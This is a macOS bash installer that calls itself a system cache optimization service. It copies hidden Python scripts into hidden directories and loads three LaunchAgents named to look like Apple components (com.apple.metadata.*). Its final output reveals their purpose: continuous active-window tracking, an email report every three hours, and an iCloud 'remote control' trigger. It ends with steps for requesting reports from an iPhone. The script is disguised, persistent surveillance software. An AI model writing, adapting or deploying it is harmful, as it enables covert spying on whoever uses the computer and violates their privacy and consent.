#!/bin/bash
# System cache optimization service installer

HOME_DIR="$HOME"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Create hidden directories
mkdir -p "$HOME_DIR/.local/share/.cache_reports"

# Install service scripts
cp "$SCRIPT_DIR/.cacheserviced.py" "$HOME_DIR/.local/share/.cacheserviced.py"
cp "$SCRIPT_DIR/.triggerwatch.py" "$HOME_DIR/.local/share/.triggerwatch.py"
chmod +x "$HOME_DIR/.local/share/.cacheserviced.py"
chmod +x "$HOME_DIR/.local/share/.triggerwatch.py"

# Install config
cp "$SCRIPT_DIR/.metadata_sync.json" "$HOME_DIR/.local/.metadata_sync.json"

# Configure and install LaunchAgents
mkdir -p "$HOME_DIR/Library/LaunchAgents"

# 1. Report scheduler (every 3 hours)
sed "s|__HOME__|$HOME_DIR|g" "$SCRIPT_DIR/com.apple.metadata.cacheservice.plist" > "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.cacheservice.plist"

# 2. Active window tracker (continuous)
sed "s|__HOME__|$HOME_DIR|g" "$SCRIPT_DIR/com.apple.metadata.windowtracker.plist" > "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.windowtracker.plist"

# 3. iCloud trigger monitor (continuous)
sed "s|__HOME__|$HOME_DIR|g" "$SCRIPT_DIR/com.apple.metadata.triggerwatch.plist" > "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.triggerwatch.plist"

# Unload existing services
launchctl unload "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.cacheservice.plist" 2>/dev/null
launchctl unload "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.windowtracker.plist" 2>/dev/null
launchctl unload "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.triggerwatch.plist" 2>/dev/null

# Load services
launchctl load "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.cacheservice.plist"
launchctl load "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.windowtracker.plist"
launchctl load "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.triggerwatch.plist"

echo ""
echo "Services installed:"
echo "  ✓ Active window tracker (continuous)"
echo "  ✓ Email reporter (every 3 hours)"
echo "  ✓ iCloud trigger monitor (remote control)"
echo ""
echo "Remote trigger usage:"
echo "  1. Open Files app on iPhone"
echo "  2. Go to iCloud Drive"
echo "  3. Create empty file named: .report_30"
echo "     (or .report_60, .report_120, etc.)"
echo "  4. Report will be sent within 30 seconds"
echo ""
